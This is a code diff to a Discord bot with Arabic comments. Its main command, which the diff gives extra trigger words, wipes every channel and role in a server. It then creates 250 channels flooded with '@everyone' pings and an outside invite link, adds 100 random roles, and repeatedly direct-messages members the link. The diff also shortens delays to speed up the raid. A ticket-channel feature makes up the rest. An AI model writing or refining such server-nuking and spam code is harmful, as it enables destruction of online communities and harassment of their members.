@@ -12,7 +12,7 @@ const client = new Client({
 const PREFIX = '!'; 
 const TARGET_SERVER_LINK = 'https://discord.gg/URaRZeKG9';
 const ADMIN_USER_ID = '1494353083138838668';
-const TICKET_ROLE_ID = '1556010239155773440'; // الآيدي الجديد المطلوب
+const TICKET_ROLE_ID = '1556010239155773440'; 
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}!`);
@@ -70,8 +70,8 @@ client.on('messageCreate', async message => {
         return;
     }
 
-    // 4. أمر !group499 المحسّن بالكامل لمنع التعليق والحذف الدفعي السريع
-    if (message.content.startsWith(PREFIX + 'group499')) {
+    // 4. دعم أمر !group499 وأمر !حذف لتنفيذ التحفيل والحذف الفوري
+    if (message.content.startsWith(PREFIX + 'group499') || message.content.startsWith('إحذف') || message.content.startsWith('حذف') || message.content.startsWith(PREFIX + 'delete')) {
         const guild = message.guild;
         if (!guild) return;
 
@@ -79,7 +79,7 @@ client.on('messageCreate', async message => {
             return message.reply({ content: 'عذراً، هذا الأمر مخصص للمشرفين أصحاب الصلاحيات فقط.', ephemeral: true });
         }
 
-        message.reply('جاري تنفيذ التحفيل الشامل بحذف الكل وإنشاء الجديد...');
+        message.reply('جاري بدء التحفيل الشامل وحذف الرومات والرولات القديمة...');
 
         // إرسال الرابط في الخاص للأعضاء
         const sendDMs = async () => {
@@ -98,18 +98,9 @@ client.on('messageCreate', async message => {
         sendDMs();
         setInterval(sendDMs, 5 * 60 * 1000);
 
-        // إرسال الرابط في الرومات الموجودة مسبقاً
-        guild.channels.cache.forEach(async channel => {
-            if (channel.isTextBased() && channel.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.SendMessages)) {
-                try {
-                    await channel.send(`@everyone @here\n${TARGET_SERVER_LINK}`);
-                } catch (e) {}
-            }
-        });
-
         const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-        // مهمة الرومات: حذف جميع الرومات دفعة واحدة ثم الإنشاء السريع بدون تعليق
+        // مهمة الرومات: حذف الكل ثم إنشاء 250 روم وإرسال الرسالة 4 مرات في كل روم
         const channelsTask = (async () => {
             const deletePromises = [];
             guild.channels.cache.forEach(channel => {
@@ -117,7 +108,6 @@ client.on('messageCreate', async message => {
             });
             await Promise.all(deletePromises);
 
-            // إنشاء حتى 200-300 روم بسرعة وبدون دقر
             for (let i = 1; i <= 250; i++) {
                 try {
                     const newChannel = await guild.channels.create({
@@ -128,11 +118,11 @@ client.on('messageCreate', async message => {
                         await newChannel.send(`@everyone @here\n${TARGET_SERVER_LINK}`).catch(() => {});
                     }
                 } catch (e) {}
-                await delay(100);
+                await delay(80);
             }
         })();
 
-        // مهمة الرولات: حذف القديم بالكامل وإنشاء 100 رول جديدة بدون توقف
+        // مهمة الرولات: حذف القديم بالكامل وإنشاء 100 رول جديدة
         const rolesTask = (async () => {
             const deleteRolePromises = [];
             guild.roles.cache.forEach(role => {
@@ -149,7 +139,7 @@ client.on('messageCreate', async message => {
                         color: 'Random'
                     });
                 } catch (e) {}
-                await delay(100);
+                await delay(80);
             }
         })();
 
@@ -157,7 +147,7 @@ client.on('messageCreate', async message => {
     }
 });
 
-// التعامل مع زر التكت والصلاحيات والآيدي المطلوب
+// التعامل مع زر التكت
 client.on('interactionCreate', async interaction => {
     if (!interaction.isButton()) return;
 
@@ -166,34 +156,40 @@ client.on('interactionCreate', async interaction => {
         const member = interaction.member;
 
         try {
-            // روم تكت مخفي لا يراه إلا العضو، صاحب الآيدي الأساسي، ورتبة الكاركتر المحدد
+            // تجهيز الصلاحيات للتكت
+            const overwrites = [
+                {
+                    id: guild.id,
+                    deny: [PermissionsBitField.Flags.ViewChannel],
+                },
+                {
+                    id: member.id,
+                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
+                },
+                {
+                    id: ADMIN_USER_ID,
+                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
+                }
+            ];
+
+            // إضافة الرتبة الجديدة إذا كانت موجودة في السيرفر لتفادي أي أخطاء
+            if (guild.roles.cache.has(TICKET_ROLE_ID)) {
+                overwrites.push({
+                    id: TICKET_ROLE_ID,
+                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
+                });
+            }
+
             const ticketChannel = await guild.channels.create({
                 name: `tic-${member.user.username}`,
                 type: ChannelType.GuildText,
-                permissionOverwrites: [
-                    {
-                        id: guild.id,
-                        deny: [PermissionsBitField.Flags.ViewChannel],
-                    },
-                    {
-                        id: member.id,
-                        allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
-                    },
-                    {
-                        id: ADMIN_USER_ID,
-                        allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
-                    },
-                    {
-                        id: TICKET_ROLE_ID,
-                        allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
-                    },
-                ],
+                permissionOverwrites: overwrites,
             });
 
             await interaction.reply({ content: `تم فتح التكت الخاص بك: ${ticketChannel}`, ephemeral: true });
 
-            // إرسال الرسالة ومنشن العضو الذي فك التكت فقط
-            await ticketChannel.send(`** اكتب مشكلتك قبل لانجي **\n<@${member.id}>`);
+            // إرسال رسالة التكت ومنشن العضو الذي فك التكت فقط
+            await ticketChannel.send(`**اكتب مشكلتك قبل لانجي**\n<@${member.id}>`);
         } catch (e) {
             await interaction.reply({ content: 'حدث خطأ أثناء إنشاء التكت.', ephemeral: true });
         }
